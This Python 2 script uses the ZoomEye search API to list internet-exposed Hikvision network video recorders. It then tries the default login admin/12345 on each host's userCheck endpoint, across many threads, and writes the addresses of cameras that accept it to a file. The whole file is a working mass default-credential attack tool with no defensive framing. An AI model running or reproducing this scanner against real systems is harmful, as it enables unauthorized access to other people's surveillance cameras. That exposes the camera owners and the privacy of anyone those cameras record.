#coding:utf8

import sys
import requests
import threading
import Queue

def login():
    username=raw_input("please enter your username:")
    password=raw_input("please enter your password:")
    login_info={
        'username':username,
        'password':password
    }
    try:
        response=requests.post(url='https://api.zoomeye.org/user/login',json=login_info)
        access_token=response.json()
        return access_token
    except Exception as e:
        print("[-]error:username or password might wrong, please try again")
        exit()

def search(access_token):
    cam_name="Hikvision Network Video Recorder http admin"
    authorization = {'Authorization': 'JWT ' + access_token["access_token"]}
    host_queue=Queue.Queue()
    page_num=int(input("Please enter the number of pages you need to scan:"))
    for page in range(1,page_num+1): 
        try:
            response=requests.get(url='https://api.zoomeye.org/host/search?query=app:'+'"'+cam_name+'"'+'&page='+str(page),headers = authorization)
            search_data=response.json()
            for item in search_data["matches"]:
                host=item["ip"]+":"+str(item["portinfo"]["port"])
                host_queue.put(host.replace('\n',''))
        except Exception as e:
            continue
    get_search_result(host_queue)


def verify_vuln_cam(host_queue,result_file):
    #判断该摄像头是否存在否存在弱口令
    while not host_queue.empty():
        host=host_queue.get()
        try:
            url="http://"+host+"/ISAPI/Security/userCheck"
            response=requests.get(url=url,auth=('admin','12345'))
            if "<statusValue>200</statusValue>" in response.text:
                print("http://"+host+"/doc/page/login.asp")
                result_file.write("http://"+host+"/doc/page/login.asp\n")
        except Exception as e:
            pass


def get_search_result(host_queue):
    thread_list=[]
    thread_num=input("Please enter the number of threads:")
    print("Scan start...")
    result_file=open("vuln_cam.txt","w")
    for x in range(0,int(thread_num)):
        th=threading.Thread(target=verify_vuln_cam,args=(host_queue,result_file))
        thread_list.append(th)
    for t in thread_list:
        t.start()
    for t in thread_list:
        t.join()
    result_file.close()
    print("Scan completed!")


def main():
    access_token=login()
    search(access_token)

if __name__ == '__main__':
    main()